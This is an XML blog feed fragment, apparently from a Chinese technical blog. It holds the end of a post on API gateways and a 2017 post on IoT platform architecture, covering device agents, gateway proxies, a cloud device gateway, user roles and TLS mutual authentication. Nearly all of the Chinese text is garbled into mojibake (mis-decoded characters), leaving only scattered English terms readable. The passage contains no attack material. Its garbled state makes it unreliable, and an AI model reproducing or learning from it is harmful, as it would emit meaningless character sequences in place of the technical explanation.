ä½†æ˜¯åç«¯ å¯èƒ½æä¾›æœåŠ¡çš„åè®®å¯èƒ½å„ä¸ç›¸åŒé€š, æ¯”å¦‚gRPC, HTTP, MQ, ç­‰ã€‚å› æ­¤ç½‘å…³åº”è¯¥èƒ½é€‚é…å¤šåè®®çš„æ”¯æŒã€‚ è¯·æ±‚è·¯ç”±åŸºäºURLçš„è·¯ç”±åŠŸèƒ½ APIä½¿ç”¨ç»Ÿè®¡è®°å½•API Metricå¦‚è¯·æ±‚æ¬¡æ•°ã€è¯·æ±‚å¤§å°ã€å“åº”çŠ¶æ€å’Œå»¶è¿Ÿï¼Œå¯è§†åŒ–API Metric å‚è€ƒæµ…è°ˆ API Gatewayå¾®æœåŠ¡æ¶æ„ä¸­çš„API Gatewayå¾®æœåŠ¡å®æˆ˜ï¼ˆäºŒï¼‰ï¼šä½¿ç”¨API Gatewayä¼ä¸šçº§APIç½‘å…³çš„è®¾è®¡é¢å‘æœåŠ¡æ¶æ„]]></content>
      <categories>
        <category>å¾®æœåŠ¡</category>
        <category>APIGateway</category>
      </categories>
      <tags>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOTæ¶æ„]]></title>
    <url>%2F2017%2F07%2F17%2Fiot-architecture%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘å¼€å‘äº†ä¸€æ¬¡IOTç»„ä»¶, åœ¨æ­¤æœŸé—´ä¹Ÿå‚è€ƒäº†ä¸‹å…¶ä»–IOTå¹³å°çš„è®¾è®¡æ¶æ„, æœ‰æ‰€æ„Ÿæƒ³, å› æ­¤å°†å…¶è®°å½•ä¸‹æ¥, å’Œå¤§å®¶åˆ†äº«, æ¬¢è¿äº¤æµã€‚ IOTæ˜¯ä»€ä¹ˆIoTæ˜¯Internet of Thingsçš„ç¼©å†™, å®ƒæ˜¯äº’è”ç½‘ä»äººå‘ç‰©çš„å»¶ä¼¸, æ ¸å¿ƒå’ŒåŸºç¡€ä»ç„¶æ˜¯äº’è”ç½‘æŠ€æœ¯ï¼Œæ˜¯äº’è”ç½‘æŠ€æœ¯åŸºç¡€ä¸Šçš„å»¶ä¼¸å’Œæ‰©å±•ã€‚ å®ƒå°†å„ç§ä¿¡æ¯ä¼ æ„Ÿè®¾å¤‡ï¼Œå¦‚å°„é¢‘è¯†åˆ«è£…ç½®ã€çº¢å¤–æ„Ÿåº”å™¨ã€å…¨çƒå®šä½ç³»ç»Ÿã€æ¿€å…‰æ‰«æå™¨ç­‰ç§ç§è£…ç½®, æŒ‰çº¦å®šçš„åè®®, å°†ä»»ä½•ç‰©å“ä¸äº’è”ç½‘ç›¸è¿æ¥, è¾¾åˆ°ç‰©å“ä¹‹é—´è¿›è¡Œä¿¡æ¯äº¤æ¢å’Œé€šè®¯çš„ç›®çš„ï¼Œä»¥å®ç°æ™ºèƒ½åŒ–è¯†åˆ«ã€å®šä½ã€è¿½è¸ªã€ç›‘æ§å’Œç®¡ç†ç­‰ã€‚IOTä¹Ÿå°†åŠ é€ŸAIçš„è§‰é†’, å®ƒå°†ä¸‡ç‰©äº’è”, å†åŠ ä¸Šæˆç†Ÿçš„å¤§æ•°æ®å¤„ç†, æ·±åº¦å­¦ä¹ çš„åº”ç”¨ ä¼šè®©ä¸‡ç‰©éƒ½å¸¦æœ‰çµæ€§, è¿™æ˜¯å¤šä¹ˆå®å¤§çš„ä¸€ä¸ªæ—¶ä»£, 2016è¢«ç§°ä¸ºAIçš„å…ƒå¹´, éšç€IOTçš„åŠ é€Ÿ, æˆ‘ä»¬å°†æ˜¯è¿™æ ·ä¸€ä¸ªæ—¶ä»£çš„è§è¯è€…,è§è¯AIè§‰é†’çš„ç¬¬ä¸€ä»£äººã€‚ä¸‹é¢æ˜¯ä¸€å¼ ç‰©è”ç½‘åœ¨å·¥ä¸šå¼•ç”¨çš„ä¸€å¼ å›¾è¿™æ ·çœ‹æ¥æœªæ¥å¾ˆç¾å¥½, ä½†æ˜¯ç°å®å¾ˆæ®‹é…·, å¦‚ä½•å®ç°è½åœ°ä¸€å¥—å¯é çš„IOTæ–¹æ¡ˆä»»ç„¶æ˜¯ä¸ªéš¾é¢˜, åœ¨å‚è€ƒäº†ä¸€äº›å›½å¤–çš„æ–¹æ¡ˆè¿‡å, ç»“åˆè‡ªå·±çš„å®è·µ, ç»™å‡ºäº†ä¸€ç§æˆ‘è®¤ä¸ºçš„å¯è½åˆ°çš„IOTæ–¹æ¡ˆæ¶æ„ã€‚ IOTçš„éš¾ç‚¹IOTåœ¨è½åœ°è¿‡ç¨‹ä¸­æœ‰è¯¸å¤šéš¾ç‚¹, å›½å†…å¾ˆå¤šIOTä¹Ÿæ˜¯åˆšèµ·æ­¥çš„çŠ¶æ€, èƒ½å‚è€ƒçš„å°±å›½å¤–å‡ å®¶äº‘çš„å¤§å‚å•†ã€‚ æ¶‰åŠæŠ€æœ¯ä¼—å¤šIOTæ¶‰åŠåˆ°å¾ˆå¤šæŠ€æœ¯, ä¸‹é¢ä¸€å¼ å›¾ ä»å‡ ä¸ªç»´åº¦å±•ç¤ºäº†IOTæ¶‰åŠåˆ°çš„ä¸€äº›æŠ€æœ¯ç‚¹:ä»æŠ€æœ¯ä¸Šçœ‹, æ¶‰åŠä¼—å¤šæŠ€æœ¯, å› æ­¤å¯¹å¼€å‘è€…æœ‰ä¸€å®šçš„è¦æ±‚, æ‹›äººæ˜¯ä¸ªé—®é¢˜ã€‚ æ¶æ„éš¾è®¾è®¡IOTé¢å¯¹çš„æ˜¯ä¸‡ç‰©, åœ¨ä¸‡ç‰©æ¥å…¥æ—¶éœ€è¦è€ƒè™‘åˆ° æ•°æ®çš„å®‰å…¨, é“¾æ¥çš„ç®¡ç†, æµ·é‡æµæ•°æ®ä¸Šä¼ , æµ·é‡æ•°æ®çš„å­˜å‚¨ ç®¡ç† åˆ†æã€‚ç»¼åˆæ¥è¯´ æ¶æ„è®¾è®¡å¿…é¡»æ»¡è¶³: æµ·é‡ã€é€šç”¨ã€å¯æ‰©å±•ã€ç®€å• å› æ­¤è¿™æ˜¯ä¸€å¥—åºå¤§çµæ´»çš„ç³»ç»Ÿ, è€Œè¿™æ ·çš„ç³»ç»Ÿ å¾€å¾€äº‘å‚å•†æ¯”è¾ƒæœ‰ç»éªŒ, æ¯”å¦‚Openstackçš„è®¾è®¡å°±æ˜¯ä¸€ä¸ªä¸é”™çš„æ¶æ„ã€‚æ•´ä½“è€Œè¨€IOTçš„æ¶æ„åº”è¯¥å±äºå¾®æœåŠ¡æ¶æ„, å¾®æœåŠ¡æ¶æ„çš„è®¾è®¡å’Œå¼€å‘ å¾€å¾€éƒ½æ˜¯æŠŠåŒåˆƒå‰‘, å¦‚æœåˆ’ä¸æ¸…æœåŠ¡çš„è¾¹ç•Œ(é¢†åŸŸåˆ’åˆ†)å’Œè§„èŒƒä¸äº†æœåŠ¡äº¤äº’çš„æµç¨‹å’Œæ–¹å¼, é‚£ä¹ˆè¿™æ ·çš„æ¶æ„ä¹Ÿæ˜¯ä¸€ä¸ªç¾éš¾, æœ€ç»ˆé€ æˆ ç†ä¸æ–­å‰ªè¿˜ä¹±çš„ä¸€ä¸ªå±€é¢ã€‚ä¸‹é¢æ˜¯ä¸€å¼ åŸºç¡€çš„IOTæ¶æ„å›¾, èƒ½å¾ˆå¥½çš„æè¿°IOTä¸­æ ¸å¿ƒçš„å…³é”®ç‚¹: æ¶æ„æ¦‚è¿°å†å¤æ‚çš„äº‹å„¿, ä¹Ÿéœ€è¦æŠ“ä½å…¶æ ¸å¿ƒç‚¹ æ‰èƒ½æœ‰æ•ˆå±•å¼€ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸ªæ¶æ„çš„ç²¾é«“æ˜¯å•¥, åœ¨å›´ç»•é‚£æ ¸å¿ƒç‚¹ã€‚å‚è€ƒä¸Šé¢é‚£å¼ æ¶æ„å›¾, æˆ‘ä»¬å¯ä»¥ç†è§£IOTçš„æ ¸å¿ƒåœ¨å®Œæˆè¿™æ ·å‡ ä»¶äº‹: è¿æ¥è®¾å¤‡ è®¾å¤‡æ•°æ®åˆ†æ è®¾å¤‡æ•°æ®è¿è¥ä¸å¯è§†åŒ– æ ¸å¿ƒä¹‹å¤–æ˜¯ä»¥ä¸‹å‘¨è¾¹æœåŠ¡, ç”¨äºæå‡å’Œæ‰©å±•åŠŸèƒ½: åŠŸèƒ½å¹³å°: æ¯”å¦‚æ¶ˆæ¯é€šçŸ¥, æä¾›å¯¹å¹³å°æ ¸å¿ƒåŠŸèƒ½ä»¥å¤–çš„ä¸€äº›è¡¥å……ã€‚ æ¶æ„è¯¦è§£åœ¨å‚è€ƒäº†AWSå’ŒAzureçš„IOTè¿‡å, ç»“åˆè‡ªå·±çš„è®¤è¯†,æ€»ç»“å‡ºæ¥çš„IOTæ¶æ„å›¾ã€‚æŒ‰ç…§é¢†åŸŸå¯¹æ¨¡å—è¿›è¡Œåˆ’åˆ†, ä¸»è¦ç”±å‡ ä¸‹å‡ ä¸ªæ¨¡å—ç»„æˆ: è¿æ¥è®¾å¤‡: æœ¬åœ°: è´Ÿè´£è®¾å¤‡æ•°æ®çš„é‡‡é›†ä¸ŠæŠ¥ä¸åå‘æ§åˆ¶ã€‚ äº‘ç«¯: å°†æ‰€æœ‰è®¾å¤‡æ¥å…¥äº‘ï¼Œæ¥æ”¶æ•°æ®ï¼ŒåŒæ—¶è´Ÿè´£ç®¡ç†è¿™äº›è®¾å¤‡çš„æˆæƒå’Œé™åˆ¶ æ•°æ®åˆ†æ: é€šè¿‡æä¾› ç¦»çº¿è®¡ç®—æˆ–è€…åœ¨çº¿è®¡ç®—çš„å¯ç¼–ç¨‹æ¥å£ ä¸ºç”¨æˆ·æä¾›æ•°æ®åˆ†æçš„èƒ½åŠ› æ•°æ®å¯è§†åŒ–ä¸è¿è¥: é‡‡é›†ä¸ŠæŠ¥çš„æ•°æ®ä»¥åŠåˆ†æè¿‡åçš„æ•°æ®çš„å¯è§†åŒ–, æ•°æ®æ ‡è®°, æ•°æ®æˆæƒç­‰å¸¦ä¸šåŠ¡æ€§è´¨çš„æ•°æ®ç®¡ç†ã€‚ APIç½‘å…³: è´Ÿè´£è¯·æ±‚çš„ç»Ÿä¸€ä»£ç†, å±è”½æ‰å†…éƒ¨ç³»ç»Ÿçš„å¤æ‚æ€§ã€‚ ç”¨æˆ·ç®¡ç†: ç»Ÿä¸€çš„ç”¨æˆ·ä½“ç³» ç”¨äºç”¨æˆ·ç®¡ç†, æƒé™ç®¡ç† æ¦‚å¿µç®€ä»‹æ•´ä¸ªæ¶æ„ä¸­ è®¾è®¡åˆ°å¦‚ä¸‹ä¸€äº›æ¦‚å¿µ: ä¸šåŠ¡æ¦‚å¿µ: ä¸æ•°æ®ç›¸å…³, ç”¨æˆ·è‡ªå·±å®šä¹‰çš„ è®¾å¤‡(device): ç”¨æˆ·çš„éœ€è¦æ¥å…¥äº’è”ç½‘çš„å®ä½“è®¾å¤‡ ç³»ç»Ÿæ¦‚å¿µ: ä¸ç³»ç»Ÿç»„ä»¶ç›¸å…³, é€šè¿‡ç³»ç»Ÿç»„ä»¶æ¥æ¥å…¥çš„æ•°æ®çš„ç»„ä»¶ ä»£ç†(agent): è·å–è®¾å¤‡ä¿¡æ¯å’Œæ§åˆ¶è®¾å¤‡çš„ä»£ç† è®¾å¤‡ç½‘å…³ä»£ç†(device-gateway-proxy): ä»£ç†device-gatewayéªŒè¯è®¾å¤‡, ä»£ç†è®¾å¤‡ä¸äº‘ç«¯é€šä¿¡ è®¾å¤‡ç½‘å…³(device-gateway): äº‘ç«¯è®¾å¤‡ç½‘å…³, ç®¡ç†è®¾å¤‡æ¥å…¥æ•´ä¸ªç³»ç»Ÿå¯¹äºä¸åŒè§’è‰²çš„åˆ’åˆ†: è¶…çº§ç®¡ç†å‘˜: å…·æœ‰ç³»ç»Ÿå·²ç»æ•°æ®çš„æ‰€æœ‰æƒé™ è®¾å¤‡ç®¡ç†å‘˜: è´Ÿè´£å°†è®¾å¤‡åŠ å…¥ç³»ç»Ÿ, æŸ¥çœ‹è®¾å¤‡çš„æ•°æ®, ä»¥åŠä»¥è®¾å¤‡ä¸ºç»´åº¦çš„æ•°æ®æƒé™åˆ†é… æ•°æ®è¿è¥å‘˜: è´Ÿè´£ç‚¹ä½æ•°æ®çš„å¤šç»´åº¦ç®¡ç†(åŸºç¡€ç»´åº¦æ˜¯è®¾å¤‡), ä»¥ä¸šåŠ¡ä¸ºç»´åº¦çš„æ•°æ®æƒé™åˆ†é… ç®—æ³•ç®¡ç†å‘˜: è´Ÿè´£ç®¡ç†å’Œè¿è¡Œç›¸åº”ç»´åº¦çš„ç®—æ³•(åŸºç¡€ç»´åº¦æ˜¯è®¾å¤‡), ä»¥åŠæ•°æ®çš„æŸ¥çœ‹æƒé™ æ™®é€šç”¨æˆ·æˆ–è€…ç¬¬ä¸‰æ–¹å¼€å‘è€…: è´Ÿè´£ç‚¹ä½æ•°æ®çš„å¤šç»´åº¦æŸ¥çœ‹(åŸºç¡€ç»´åº¦æ˜¯è®¾å¤‡) è®¾å¤‡è¿æ¥è®¾å¤‡çš„è¿æ¥åˆ†ä¸º2éƒ¨åˆ†äº‘ç«¯å’Œæœ¬åœ°2éƒ¨åˆ†æ„æˆ, ç”±äºäº‘ç«¯å’Œæœ¬åœ°ç½‘ç»œçš„å·®å¼‚, éœ€è¦è€ƒè™‘: ç½‘ç»œçš„å®‰å…¨ ç½‘ç»œçš„ä¸ç¨³å®šä¸ºäº†æ–¹ä¾¿æœ¬åœ°è®¾å¤‡ä¸äº‘ç«¯ç›¸è¿, éœ€è¦çº¦å®šä¸€ä¸ªåè®®, å› æ­¤éœ€è¦è€ƒè™‘: é€šä¿¡åè®®çš„å¤šé€‚é…: æ¯”å¦‚MQTT, HTTP, CoAPç­‰ æ•°æ®æ ¼å¼å®šä¹‰ç”±äºæœ¬åœ°ç½‘ç»œçš„å¤æ‚å¤šå˜æ€§, æˆ‘ä»¬å¯èƒ½éœ€è¦é¢å¯¹ä¸åŒçš„åœºæ™¯: è®¾å¤‡èƒ½ç›´æ¥è”ç½‘ä¸ŠæŠ¥æ•°æ® è®¾å¤‡æ— æ³•è”ç½‘, éœ€è¦å°†æ•°æ®å‘ç”Ÿç»™æœ¬åœ°ä¸€ä¸ªç½‘å…³ä»£ç†, ç”±ç½‘å…³ä»£ç†ç»Ÿä¸€ä¸ŠæŠ¥æ•°æ®è®¾å¤‡è¿æ¥çš„ä¸€ä¸ªæ¶æ„ç¤ºæ„å›¾: æœ¬åœ°æœ¬åœ°ä¼šè´Ÿè´£è®¾å¤‡æ•°æ®çš„é‡‡é›†ä¸ŠæŠ¥ä»¥åŠæ§åˆ¶, è¿™äº›åŠŸèƒ½ç”±ä¸€ä¸ªagentè´Ÿè´£å®Œæˆ, å®ƒåŠŸèƒ½æ–¹å‘å¦‚ä¸‹: æ•°æ®é‡‡é›†ä¸ä¸ŠæŠ¥: é…ç½®äº‘ç«¯å‡­è¯, æŒ‰ç…§çº¦å®šåè®®ä¸ŠæŠ¥è®¾å¤‡æ•°æ®ã€‚ æ¥æ”¶äº‘ç«¯æ§åˆ¶: å‘äº‘ç«¯æ±‡æŠ¥æ§åˆ¶æŒ‡ä»¤, æ¥æ”¶äº‘ç«¯å‘èµ·çš„æ§åˆ¶,ä»¥åŠè¿”å›æ‰§è¡Œç»“æœã€‚ è®¾å¤‡ä»£ç†(agent)è®¾å¤‡ä»£ç†è´Ÿè´£æ”¶é›†è®¾å¤‡çš„æ•°æ®, ç„¶åä¸ŠæŠ¥ç»™äº‘ç«¯ç½‘å…³, agentä½äºæ•°æ®ç¬¬ä¸€çº¿, éœ€è¦è€ƒè™‘è‰¯å¥½çš„æ‰©å±•æ€§, å› æ­¤é€‚åˆé‡‡ç”¨ æ’ä»¶å¼ é©±åŠ¨å¼€å‘æ¨¡å¼ã€‚é‡‡é›†å™¨éœ€è¦ä»äº‘ç«¯è·å–è¯ä¹¦, é…ç½®äº‘ç«¯è®¾å¤‡ç¼–å·, ç„¶åæŒ‰ç…§æŒ‡å®šçš„æŠ¥æ–‡æ ¼å¼ å°†æ•°æ®ä¸ŠæŠ¥ç»™äº‘ç«¯ã€‚æ¯”å¦‚äº‘ç«¯è§„èŒƒçš„æ•°æ®ä¸ŠæŠ¥æ ¼å¼,ä»¥influxDBçš„æ•°æ®å†™å…¥æ ¼å¼ä¸ºä¾‹è¯´æ˜:1234measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]1. ä¸€ç±»è®¾å¤‡ä¸€ä¸ªåº“, æ¯”å¦‚è½¦, æ¯”å¦‚é£æœº, ä¸€ä¸ªåº“é‡Œé¢å­˜æ”¾æ‰€æœ‰è¿™ç±»è®¾å¤‡çš„æŒ‡æ ‡, ä¸€ç»„ç›¸å…³çš„æŒ‡æ ‡ä¸€ä¸ªç»„, æ¯”å¦‚å˜é€Ÿå™¨, é½¿è½®ç®±, ç®—æ³•è®¡ç®—çš„å¹³å‡é£é€Ÿ2. æ‰€æœ‰ä¸æ•°æ®æ— å…³çš„æ•°æ® å‡ä»¥æ ‡ç­¾çš„æ–¹å¼å½•å…¥, è¿™äº›Tagåˆ†ä¸º2ç±»: 1.ç³»ç»Ÿæ ‡ç­¾: device-id, collector-id 2. ç”¨æˆ·è‡ªå®šä¹‰æ ‡ç­¾ agentæ ¸å¿ƒåŠŸèƒ½ç‚¹æ¦‚è¿°: æ•°æ®é‡‡é›†ä¸ä¸ŠæŠ¥ æ•°æ®é‡‡é›†: ä»¥æ’ä»¶çš„å½¢å¼, æ”¯æŒå¤šåè®®é€‚é…, é»˜è®¤æƒ…å†µä¸‹ åªè¦æ•°æ®ç¬¦åˆè§„èŒƒ å°±å¯ä»¥ä¸ŠæŠ¥ æ•°æ®å¤„ç†: å¦‚ä½•æ•°æ®ä¸ç¬¦åˆè§„èŒƒ, éœ€è¦ç¼–å†™ æ•°æ®å¤„ç†æ’ä»¶, å¤„ç†æˆåˆæ³•è§„åˆ™ èšåˆæ•°æ®: å¦‚æœæ•°æ®é‡è¿‡å¤§, å¯ä»¥ç¼–å†™èšåˆæ’ä»¶, å¯¹æ•°æ®è¿›è¡Œèšåˆ, æ¯”å¦‚é’ˆå¯¹è®¾å¤‡éœ‡é¢‘æ•°æ®ã€‚ æ•°æ®ä¸ŠæŠ¥: ç»å†æ‰€æœ‰ä»¥ä¸Šæ­¥éª¤è¿‡å, å°†æ•°æ®é€šè¿‡è®¾å¤‡çš„æ•°æ®ä¸ŠæŠ¥ç®¡é“ä¸ŠæŠ¥äº‘ç«¯ è®¾å¤‡æ§åˆ¶: æ§åˆ¶æŒ‡ä»¤ä¸ŠæŠ¥: agentå¯åŠ¨æ—¶éœ€è¦å°† å·²ç»å®ç°çš„æ§åˆ¶æŒ‡ä»¤é€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“å‘äº‘ç«¯æ±‡æŠ¥ã€‚ æ‰§è¡Œæ§åˆ¶æŒ‡ä»¤: agentè®¢é˜…æ§åˆ¶ä¸‹å‘ç®¡é“, å½“æœ‰å‘½ä»¤åˆ°æ¥æ—¶, ç«‹é©¬æ‰§è¡Œ, å¹¶ä¸”å°†ç»“æœå†™å›æ§åˆ¶ä¸Šä¼ ç®¡é“ã€‚ å¼‚å¸¸å¤„ç†: è®¾å¤‡ä¸‹çº¿å¼‚å¸¸: ç”±äºè®¾å¤‡ä¸‹çº¿æ— æ³•å’Œè®¾å¤‡å»ºç«‹è¿æ¥, æ— æ³•é‡‡é›†æ•°æ®(DeviceOffLineError), é€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ ç‚¹ä½é‡‡é›†å¼‚å¸¸: ç”±äºè®¾å¤‡æ²¡æœ‰è¯¥ç‚¹ä½, æ— æ³•è·å–åˆ°è¯¥ç‚¹ä½æ•°æ®(NoPointError), é€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ agentæ§åˆ¶: ä»£ç†é…ç½®: é€šè¿‡æ§åˆ¶ä¸‹å‘é€šé“, ä¸‹å‘ä»£ç†é…ç½®. ä»£ç†é‡å¯: é€šè¿‡æ§åˆ¶ä¸‹å‘é€šé“, å¾—çŸ¥ä»£ç†é‡æ–°é€šçŸ¥, é‡å¯ä»£ç†. çŠ¶æ€ä¸ŠæŠ¥: é€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“, æ±‡æŠ¥ä»£ç†çŠ¶æ€ agentå¼‚å¸¸: ä»£ç†è¿è¡Œå¼‚å¸¸: ä»£ç†å¼‚å¸¸ä¸‹çº¿åŠæ—¶é€šçŸ¥äº‘ç«¯(AgentRuntimeError) ç½‘å…³ä»£ç†(device-gateway-proxy)ç½‘å…³ä»£ç†ä¸»è¦è¿ç”¨äºä»£ç†æ— æ³•è®¿é—®å…¬ç½‘çš„åœºæ™¯(æœ‰ç«å¢™), å®ƒåœ¨æœ¬åœ°ç½‘ç»œä¸­æ‰®æ¼”ç€äº‘ç«¯ç½‘å…³çš„è§’è‰², æ§åˆ¶ç€æ‰€æœ‰è®¾å¤‡çš„è¿æ¥, å› ä¸ºä»–æ˜¯ä»£ç†, æ‰€æœ‰ç›¸å…³æ§åˆ¶ä¿¡æ¯å‡ä»äº‘ç«¯ç½‘å…³è·å–ã€‚ç½‘å…³ä»£ç†åœ¨è®¾è®¡æ—¶éœ€è¦æ»¡è¶³å¦‚ä¸‹åŸåˆ™: é€æ˜æ€§: å¯¹äºäº‘ç«¯æ¥è¯´, ä¸èƒ½å› ä¸ºä»£ç†è€Œå¸¦æ¥è®¾å¤‡å¤„ç†çš„å·®å¼‚æ€§, å› æ­¤ä»£ç†ä¸»è¦åŠŸèƒ½æ˜¯ä»£ç†è®¾å¤‡ ä¸ äº‘ç«¯é€šä¿¡, å¯¹äºäº‘ç½‘å…³æ¥è¯´ çœ‹åˆ°çš„ä¾ç„¶æ˜¯è®¾å¤‡,è€Œä¸æ˜¯ä»£ç†ã€‚ ç¼“å­˜æ€§: ä»£ç†éœ€è¦é¢ä¸´ç½‘ç»œä¸­æ–­,æ‰€ä»¥éœ€è¦æœ‰æ•°æ®ç¼“å­˜æœºåˆ¶, å¹¶ä¸”å¯ä»¥é…ç½®å­˜å‚¨ç­–ç•¥ã€‚ä»¥ä¸‹æ˜¯gateway-proxyçš„æ ¸å¿ƒåŠŸèƒ½æ¦‚è¿°: æ•°æ®ä¸ŠæŠ¥: æ£€æŸ¥è®¾å¤‡åˆæ³•æ€§: ç½‘å…³ä»£ç†èƒ½ä»£ç†é‚£äº›è®¾å¤‡å»ºç«‹è¿æ¥ éœ€è¦ä»äº‘ç«¯ç½‘å…³è·å–, å¦‚æœè®¾å¤‡ä¸åˆæ³•, åˆ™æ‹’ç»ä¸ºè¯¥è®¾å¤‡å»ºç«‹è¿æ¥ã€‚ æ•°æ®ä¸ŠæŠ¥: ç½‘å…³ä»£ç†æ¨¡æ‹Ÿagentä¸çœŸæ­£çš„ç½‘å…³å»ºç«‹è¿æ¥, é€šè¿‡è®¾å¤‡æ•°æ®ä¸ŠæŠ¥é€šé“ä¸ŠæŠ¥æ•°æ®åˆ°äº‘ç«¯ã€‚ è®¾å¤‡æ§åˆ¶: æ§åˆ¶æŒ‡ä»¤ä¸ŠæŠ¥: ä»£ç†è®¾å¤‡å»ºç«‹æ§åˆ¶ä¸Šä¼ é€šé“, ä¸ŠæŠ¥æ§åˆ¶æŒ‡ä»¤åˆ°äº‘ç«¯ã€‚ æ‰§è¡Œæ§åˆ¶æŒ‡ä»¤: ä»£ç†è®¾å¤‡æ¥æ”¶æ§åˆ¶ä¸‹å‘é€šé“é‡Œé¢çš„ æ§åˆ¶æŒ‡ä»¤, è°ƒåº¦ç»™agentæ‰§è¡Œ, å°†ç»“æœè¿”å›åˆ°æ§åˆ¶ä¸Šå»é€šé“ã€‚ å¼‚å¸¸å¤„ç†: è®¾å¤‡ä¸‹çº¿å¼‚å¸¸: ç”±äºè®¾å¤‡ä¸‹çº¿æ— æ³•å’Œè®¾å¤‡å»ºç«‹è¿æ¥, æ— æ³•é‡‡é›†æ•°æ®(DeviceOffLineError), é€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ ç‚¹ä½é‡‡é›†å¼‚å¸¸: ç”±äºè®¾å¤‡æ²¡æœ‰è¯¥ç‚¹ä½, æ— æ³•è·å–åˆ°è¯¥ç‚¹ä½æ•°æ®(NoPointError), é€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ ç½‘å…³ä»£ç†æ§åˆ¶: proxyé…ç½®: é€šè¿‡proxyçš„æ§åˆ¶ä¸Šä¼ é€šé“ è¯·æ±‚ proxyçš„é…ç½®ä¿¡æ¯, é…ç½®proxyéœ€è¦ä»£ç†çš„è®¾å¤‡åˆ—è¡¨ proxyä»å¯: é€šè¿‡proxyçš„æ§åˆ¶ä¸‹å‘é€šé“ æ‰§è¡Œäº‘ç«¯å¯¹proxyçš„æ“ä½œ proxyçŠ¶æ€ä¸ŠæŠ¥: proxyé€šè¿‡æ§åˆ¶ä¸Šä¼ é€šé“ ä¸ŠæŠ¥è‡ªèº«çŠ¶æ€ agentçŠ¶æ€ä»£ç†ä¸ŠæŠ¥: proxyä»£ç†agent ä¸ŠæŠ¥çŠ¶æ€(proxyæ§åˆ¶ä¸Šä¼ é€šé“) agentå¼‚å¸¸ä»£ç†ä¸ŠæŠ¥: proxyä»£ç†agent ä¸ŠæŠ¥å¼‚å¸¸(proxyæ§åˆ¶ä¸Šä¼ é€šé“) ç½‘å…³ä»£ç†å¼‚å¸¸: proxyè¿è¡Œå¼‚å¸¸: åŠæ—¶å‘äº‘ç«¯ä¸ŠæŠ¥(ProxyRuntimeError), é€šè¿‡proxyæ§åˆ¶ä¸Šä¼ é€šé“ äº‘ç«¯(device-gateway)äº‘ç«¯è´Ÿè´£è®¾å¤‡çš„è¿æ¥çš„ç»„ä»¶æˆ‘ä»¬ç§°ä¹‹ä¸ºè®¾å¤‡ç½‘å…³(device-gateway), å®ƒè´Ÿè´£æ¥æ”¶è®¾å¤‡ä¸Šä¼ çš„æ•°æ®ä¸è®¾å¤‡çš„æ§åˆ¶ã€‚è®¾å¤‡ç½‘å…³åœ¨è®¾è®¡æ—¶éœ€è¦æ»¡è¶³å¦‚ä¸‹åŸåˆ™: æ•°æ®å®‰å…¨: ä¸ºäº†ç¡®ä¿ç½‘å…³å’Œæ•°æ®ä¸ŠæŠ¥è€…ä¹‹é—´è¿™æ®µå…¬ç½‘æ•°æ®é“¾è·¯çš„å®‰å…¨, éœ€é‡‡ç”¨TLSè¿›è¡ŒåŠ å¯†å’ŒåŒå‘è®¤è¯ã€‚ æ•°æ®ç½‘å…³éœ€å……å½“CAçš„è§’è‰², å‘agentæˆ–è€…é¢å‘æ•°å­—è¯ä¹¦ æ¥å…¥è®¾å¤‡èµ„äº§çš„ç®¡ç† æ•°æ®å­˜å‚¨: åœ¨æ•°æ®å­˜å…¥æ•°æ®åº“ä¹‹å‰,è¿™äº›æ•°æ®è¢«ç§°ä¸ºäº‹ä»¶, æ•°æ®è¢«å­˜å‚¨ä¹‹åæˆä¸ºå†å²æ•°æ®, äº‹ä»¶å’Œå†å²æ•°æ®åˆ†åˆ«å¯¹åº”ä¸åŒçš„åœºæ™¯device-gatewayçš„æ§åˆ¶å±‚åŠŸèƒ½æ¦‚è¿°: ç±»å‹ç®¡ç†:è¿æ¥ä¸Šäº‘ç«¯çš„è®¾å¤‡å¿…é¡»è¦æŒ‡æ˜è®¾å¤‡çš„ç±»å‹, è®¾å¤‡ç±»å‹ç”¨äºæ ¡éªŒ è®¾å¤‡ä¸Šä¼ çš„æ•°æ® æ˜¯å¦åˆè§„, å¦‚æœä¸åˆè§„,å°±ä¸¢å¼ƒæ‰, ä½†æ˜¯éœ€è¦è®°å½•æ—¥å¿—, è®©ç”¨æˆ·å¯ä»¥æŸ¥çœ‹ç±»å‹çš„å®šä¹‰ä»¥Jsonä¸ºä¸», éœ€è¦å®šä¹‰ å±æ€§åç§°(å­—æ®µåç§°), å­—æ®µçš„å€¼çš„æ•°æ®ç±»å‹, ä»¥åŠå…¶ä»–å­—æ®µçš„ç›¸å…³ä¿¡æ¯ã€‚ ç±»å‹çš„å¢åˆ æ”¹æŸ¥ è®¾å¤‡ç®¡ç† è®¾å¤‡åˆ›å»º: å¿…é¡»å‚æ•°å‚æ•°: è®¾å¤‡åç§°, æ¥å…¥æ–¹å¼(é€šè¿‡agentæ¥å…¥è¿˜æ˜¯é€šè¿‡proxyæ¥å…¥), è®¾å¤‡ç±»å‹(å…ˆå®šä¹‰ç±»å‹) å¯é€‰å‚æ•°: åœ°ç†ä½ç½®, è®¾å¤‡æ ‡ç­¾, å…¶ä»–å±æ€§,çœŸæ­£åˆ›å»ºæ—¶æˆ‘ä»¬éœ€è¦è€ƒè™‘: é…é¢æ£€æŸ¥(é™åˆ¶ä¸€ä¸ªç”¨æˆ·å¯ä»¥åˆ›å»ºçš„è®¾å¤‡æ•°) å¦‚æœé€šè¿‡agentæ¥å…¥, ä¸ºagenté¢å‘è®¾å¤‡æ¥å…¥è¯ä¹¦å’Œç§é’¥ ç”Ÿæˆæ¥å…¥äº‘ç«¯çš„ç”¨æˆ·å’Œå¯†ç  é…ç½®è®¾å¤‡å’Œäº‘ç«¯é€šä¿¡çš„é€šé“ äº‘ç«¯è®¢é˜…è¿™äº›é€šé“, ç­‰å¾…æ•°æ®ä¸ŠæŠ¥æˆ–è€…æ¥è‡ªagentçš„è¯·æ±‚ 